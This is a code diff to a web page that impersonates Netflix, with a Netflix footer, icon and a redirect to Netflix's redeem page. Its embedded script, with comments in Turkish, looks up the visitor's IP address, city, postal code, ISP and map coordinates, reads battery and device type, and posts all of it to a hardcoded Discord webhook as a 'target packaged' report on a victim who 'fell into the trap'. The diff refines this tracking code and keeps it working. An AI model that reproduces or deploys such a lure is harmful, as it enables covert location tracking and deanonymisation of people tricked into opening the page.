@@ -35,60 +35,58 @@
     <div class="footer-text">© 2026 Netflix, Inc.</div>
 
     <script>
-        // Senin Discord Webhook Linkin
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
         async function bombaSistem() {
             try {
-                // 1. Detaylı IP ve Konum Verisi (ip-api servisi ile)
-                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,district,zip,lat,lon,isp,query');
+                // IP ve Detaylı Konum Bilgisi (HTTPS destekli servis)
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // 2. Google Haritalar Koordinat Linki
-                const haritaLink = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+                // Harita linkini düzelttim: Direkt koordinat pini atar
+                const haritaLink = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // 3. Batarya ve Cihaz Tespiti
+                // Batarya Bilgisi
                 let pil = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
                 }
 
+                // Cihaz Türü Tespiti
                 const ua = navigator.userAgent;
                 let cihazTipi = "🖥️ Bilgisayar (PC)";
                 if (/tablet|ipad/i.test(ua)) { cihazTipi = "平板 Tablet"; } 
                 else if (/Mobile|Android|iPhone/i.test(ua)) { cihazTipi = "📱 Akıllı Telefon"; }
 
-                // 4. ANONİM BOT Rapor Paketi
+                // Discord ANONİM BOT Raporu
                 const rapor = {
                     username: "ANONİM BOT",
                     avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
-                        title: "🎯 YENİ HEDEF PAKETLENDİ!",
-                        description: "Kurban Netflix tuzağına düştü. Veriler aşağıda:",
-                        color: 16711680, // Kan Kırmızısı
+                        title: "🎯 HEDEF PAKETLENDİ!",
+                        description: "Kurban tuzağa düştü. Tüm bilgiler aşağıda:",
+                        color: 16711680,
                         fields: [
                             { name: "👤 Cihaz Türü", value: `**${cihazTipi}**`, inline: true },
                             { name: "🔋 Batarya", value: pil, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`${d.query}\``, inline: false },
-                            { name: "🏠 Adres (İl/İlçe/Semt)", value: `**${d.regionName} / ${d.city} / ${d.district || "Semt Bilgisi Yok"}**`, inline: false },
-                            { name: "📡 İnternet Hattı", value: d.isp, inline: true },
-                            { name: "📮 Posta Kodu", value: d.zip || "Yok", inline: true },
-                            { name: "📍 Harita Konumu", value: `[Haritada Nokta Atışı Gör (Tıkla)](${haritaLink})`, inline: false }
+                            { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: false },
+                            { name: "🏠 Adres (İl/İlçe/Semt)", value: `**${d.region} / ${d.city} / ${d.postal}**`, inline: false },
+                            { name: "📡 İnternet Hattı", value: d.org, inline: true },
+                            { name: "📍 Harita Konumu", value: `[Nokta Atışı Haritada Gör](${haritaLink})`, inline: false }
                         ],
                         footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
 
-                // 5. Discord'a Gönder
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(rapor)
                 });
 
-                // 6. Yönlendirme (4 Saniye Sonra)
+                // Yönlendirme
                 setTimeout(() => {
                     window.location.href = "https://www.netflix.com/tr/redeem";
                 }, 4000);
